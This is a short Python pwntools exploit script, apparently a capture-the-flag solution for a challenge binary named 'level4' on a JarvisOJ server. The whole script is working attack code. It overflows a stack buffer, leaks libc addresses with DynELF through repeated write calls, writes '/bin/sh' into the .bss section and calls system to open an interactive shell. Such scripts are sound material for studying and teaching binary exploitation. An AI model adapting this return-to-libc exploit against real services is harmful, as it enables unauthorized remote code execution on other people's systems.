from pwn import *
p=remote('pwn2.jarvisoj.com',9880)
e=ELF('./level4')
write_plt=e.plt['write']
vul_addr=e.symbols['vulnerable_function']
read_plt=e.plt['read']
bss_addr=0x0804a024
def leak (address):
    payload='a'*(0x88+0x4)+p32(write_plt)+p32(vul_addr)+p32(1)+p32(address)+p32(4)
    p.sendline(payload)
    temp=p.recv(4)
    return temp
d=DynELF(leak,elf=ELF('./level4'))
sys_addr=d.lookup('system','libc')
payload1='a'*(0x88+0x4)+p32(read_plt)+p32(vul_addr)+p32(1)+p32(bss_addr)+p32(8)
p.sendline(payload1)
p.sendline('/bin/sh')
payload2='a'*(0x88+0x4)+p32(sys_addr)+'aaaa'+p32(bss_addr)
p.sendline(payload2)
p.interactive()
